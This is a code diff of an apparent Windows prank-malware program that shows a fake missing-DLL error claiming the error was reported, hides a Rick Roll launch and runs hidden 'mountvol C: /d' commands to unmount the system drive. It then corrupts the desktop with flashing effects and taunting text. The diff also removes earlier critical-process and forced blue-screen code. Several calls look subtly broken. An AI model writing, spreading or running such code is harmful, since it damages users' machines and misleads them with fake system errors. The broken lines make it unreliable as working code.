@@ -1,23 +1,16 @@
-//#pragma comment(lib, "Winmm.lib")
+#pragma comment(lib, "Winmm.lib")
+
+#define WIN32_LEAN_AND_MEAN
 
 #ifdef UNICODE
 #undef UNICODE
+#define MULTIBYTE
 #endif
 
-#include <iostream>
-#include <Windows.h>
-#include <math.h>
-#include <random>
-
+#include "include.h"
 #include "payloads.h"
 
-typedef NTSTATUS(NTAPI* fnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
-typedef NTSTATUS(NTAPI* fnNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);
-typedef NTSTATUS(NTAPI* fnNtSetInformationProcess)(HANDLE hProcess, ULONG ulClassInfo, PVOID pProcessInformation, ULONG pProcessInformationSize);
-
-typedef int (*functionarray) ();
-
-
+typedef int (*functionarray)();
 
 DWORD WINAPI audio(LPVOID lpParam) {
     while (true) {
@@ -27,65 +20,48 @@ DWORD WINAPI audio(LPVOID lpParam) {
     ExitThread(0);
 }
 
-void RickRoll() {
-
-}
-
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, INT nCmdShow) {
-    if (MessageBoxW(NULL, L"This program contains rapid flashing lights and loud audio. Are you sure you want to continue?", L"WARNING", MB_YESNO | MB_ICONEXCLAMATION) != IDYES)
-    {
+    if (MessageBoxW(NULL, "This program contains rapid flashing lights and audio.\n\n"
+                          "Do you wish to continue?",
+                    L"Warning", MB_YESNO | MB_ICONWARNING) == IDNO) {
         ExitProcess(0);
     }
 
-    BOOL crash = FALSE;
-
-    if (MessageBoxW(NULL, L"Would you like this program to crash your computer or no?", L"Crash?", MB_YESNO | MB_ICONEXCLAMATION) == IDYES) {
-        crash = TRUE;
-    }
-
     functionarray payloads[] = {
-        NULL,
+        rickroll,
         p1,
         p2,
-        p3
+        p3,
+        p4,
+        p5,
+        p6,
+        p7,
+        p8,
+        p9
     }; // use: payloads[x]() for function px(). why use this? functions in random order, im still working on porting all payloads to payloads.h
-
-    rickroll();
-
-    HMODULE ntdll = LoadLibraryA("ntdll.dll");
-    fnRtlAdjustPrivilege RtlAdjustPrivilege = (fnRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
-    fnNtRaiseHardError NtRaiseHardError = (fnNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
-    fnNtSetInformationProcess NtSetInformationProcess = (fnNtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
-    
-    BOOLEAN bOld1;
-    ULONG ulBreakOnTermination1 = 1;
-    RtlAdjustPrivilege(20, TRUE, FALSE, &bOld1);
-    NtSetInformationProcess(GetCurrentProcess(), 0x1D, &ulBreakOnTermination1, sizeof(ULONG));
 
     MSGBOXPARAMS msglol = { 0 };
     msglol.cbSize = sizeof(MSGBOXPARAMS);
     msglol.hwndOwner = NULL;
     msglol.hInstance = GetModuleHandle(NULL);
-    msglol.lpszText = "Cannot find vcruntime140.dll. Click OK to terminate the program.";
+    msglol.lpszText = "Cannot find vcruntime140.dll. Click OK to terminate the program. This error has been reported.";
     msglol.lpszCaption = "Fatal error in Xytharis.exe";
     msglol.dwStyle = MB_OK | MB_ICONHAND;
     HANDLE hmsg1 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msglol, NULL, NULL);
 
     //rick roll
-    //ShellExecuteA(NULL, "open", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_SHOWDEFAULT);
-
-    /*if (playmusic) {
-        HANDLE music = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Music, NULL, 0, NULL))
-    } //add music soon, get better method*/
+    ShellExecuteA(NULL, "open", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_HIDE);
 
     HANDLE hAudio = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)audio, NULL, 0, NULL);
+
+    HANDLE hVolume = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[7], NULL, 0, NULL);
 
     ShellExecuteA(NULL, "open" "C:\\Windows\\System32\\cmd.exe", "mountvol C: /d", NULL, NULL, SW_HIDE);
     ShellExecuteA(NULL, "open" "C:\\Windows\\sysnative\\cmd.exe", "mountvol C: /d", NULL, NULL, SW_HIDE);
 
-    Sleep(10000);
+    Sleep(5000);
 
-    MSGBOXPARAMS msg2 = {0};
+    MSGBOXPARAMS msg2 = { 0 };
     msg2.cbSize = sizeof(MSGBOXPARAMS);
     msg2.hwndOwner = NULL;
     msg2.hInstance = GetModuleHandle(NULL);
@@ -103,11 +79,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     msg1.dwStyle = MB_YESNO | MB_ICONQUESTION;
     HANDLE hmsg3 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, NULL, NULL);
 
-    //p1();
+    payloads[2]();
 
-    p2();
-
-    //i have no idea what this does
     HWND desktop = GetDesktopWindow();
     RECT rect;
     GetWindowRect(desktop, &rect);
@@ -129,15 +102,9 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     //random pixels all over the place
     fori(100) {
         CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
-        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
-        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
-        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
-        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
-        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
-        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
-        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
-        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
-        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
+        fori(20) {
+            SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
+        }
         TextOutA(desk, rand() % w, rand() % h, "HAHAHAH UR SCREWED", 18);
         Rectangle(desk, rand() % w, rand() % h, rand() % w, rand() % h);
         Sleep(50);
@@ -147,19 +114,23 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     msg5.cbSize = sizeof(MSGBOXPARAMS);
     msg5.hwndOwner = NULL;
     msg5.hInstance = GetModuleHandle(NULL);
-    msg5.lpszText = "that was only round 1, have a little braek";
+    msg5.lpszText = "that was only round 1, have a little braek"; //typo intentional
     msg5.lpszCaption = "get ready";
     msg5.dwStyle = MB_YESNO | MB_ICONQUESTION;
-    HANDLE hmsg4 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg5, NULL, NULL);
+    HANDLE hmsg4 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg5, 0, &zero);
 
-    Sleep(10000);
     Ellipse(desk, rand() % w, rand() % h, rand() % w, rand() % h);
+    
+    Sleep(10000);
+    payloads[3]();
+    Ellipse(desk, rand() % w, rand() % h, rand() % w, rand() % h);
+    
     fori(50) {
         INT y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 8);
         HBRUSH brush = CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75));
         SelectObject(desk, brush);
-        BitBlt(desk, 0, y, 100, h, desk, rand() % 96 - 56, y, SRCCOPY);
-        PatBlt(desk, -1, y, 100, h, PATINVERT);
+        BitBlt(desk, 0, y, float(w / 2) + i, h, desk, rand() % 96 - 56, y, SRCCOPY);
+        PatBlt(desk, -1, y, float(w/2) + i, h, PATINVERT);
         Sleep(rand() % 1234);
     }
 
@@ -168,35 +139,65 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     fori(50) {
         LineTo(desk, rand() % w, rand() % h);
         SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
-        InvertRgn(desk, hRegion);
+        if (i % 5 == 0) {
+            InvertRgn(desk, hRegion);
+        }
         Sleep(50);
     }
 
     fori(1000) {
         i += 5;
-        BitBlt(desk, sin(i) * 5, cos(i) * i, sw, h, desk, rand() % i * 50, rand() % i * 50, 0x00D80745);
+        BitBlt(desk, sin(i) * 5, cos(i) * i, sw, h, desk, rand() % i * 50, rand() % i * 50, SRCCOPY);
     } 
 
     fori(50) {
-        
+        BitBlt(desk, i + 5, i - 5, sw, h, desk, rand() % 1920, rand() % 1080, 0x000D0B25);
+        PatBlt(desk, i + 5, i - 5, rand() % 1920, rand() % 1080, PATINVERT);
+        Sleep(100);
     }
 
+    fori(50) {
+        BitBlt(desk, i, i, sw, h, desk, rand() % 694, rand() % 114, SRCERASE);
+        Sleep(50);
+    }
+
+    payloads[4]();
+
+    HANDLE hHDC = CreateCompatibleDC(desk);
+
+    fori(360) {
+        HBRUSH bruh = CreateSolidBrush(rgb(69, 72, 96));
+        BitBlt(desk, 0, sin(i), sw, h, hHDC, 0, 0, SRCCOPY);
+        PatBlt(desk, 0, 0, sw, h, desk, PATINVERT);
+        Sleep(50);
+    }
+
+    payloads[5]();
+
+    //Corrupting the desktop
+    fori(100) {
+        BitBlt(desk, rand() % w, rand() % h, rand() % w, rand() % h, desk, rand() % w, rand() % h, SRCERASE);
+        Sleep(50);
+    }
+
+    payloads[6]();
+
+    payloads[8]();
+
+    payloads[9]();
+    
+
     ReleaseDC(NULL, desk);
+    ReleaseDC(NULL, hHDC);
     CloseHandle(hmsg1);
     CloseHandle(hmsg2);
     CloseHandle(hmsg3);
     CloseHandle(hmsg4);
 
+    TerminateThread(hVolume, 1);
+    CloseHandle(hVolume);
     TerminateThread(hAudio, 1); //literally not safe
     CloseHandle(hAudio);
 
-    //crash
-    if (crash) {
-        BOOLEAN bOld2;
-        ULONG ulResponse;
-        RtlAdjustPrivilege(19, TRUE, FALSE, &bOld2);
-        NtRaiseHardError(0xC0000350, NULL, NULL, NULL, 6, &ulResponse);
-        FreeLibrary(ntdll);
-    }
     return 0;
 }
